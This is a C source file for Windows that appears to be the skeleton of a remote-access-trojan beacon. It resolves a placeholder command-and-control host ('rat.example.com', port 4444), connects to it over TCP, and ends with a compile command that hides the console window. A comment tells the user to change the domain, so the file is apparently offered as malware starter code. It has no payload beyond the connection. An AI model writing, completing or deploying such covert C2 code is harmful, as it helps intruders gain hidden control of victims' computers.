#include <winsock2.h>
#include <ws2tcpip.h>  // for getaddrinfo
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET s;
    struct addrinfo hints, *result = NULL;
    int ret;

    const char* domain = "rat.example.com"; // !!!!! change this
    const char* port = "4444";

    // create winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed.\n");
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;        //ipv4
    hints.ai_socktype = SOCK_STREAM;  //tcp

    ret = getaddrinfo(domain, port, &hints, &result);
    if (ret != 0) {
        printf("getaddrinfo failed: %d\n", ret);
        WSACleanup();
        return 1;
    }

    // create socket
    s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (s == INVALID_SOCKET) {
        printf("Socket creation failed: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Connect to c2
    ret = connect(s, result->ai_addr, (int)result->ai_addrlen);
    if (ret == SOCKET_ERROR) {
        printf("Connect failed: %ld\n", WSAGetLastError());
        closesocket(s);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    printf("Connected to %s:%s\n", domain, port);

    freeaddrinfo(result);
    closesocket(s);
    WSACleanup();

    return 0;
}

// compile: cl /O2 /SUBSYSTEM:WINDOWS yourprogram.c ws2_32.lib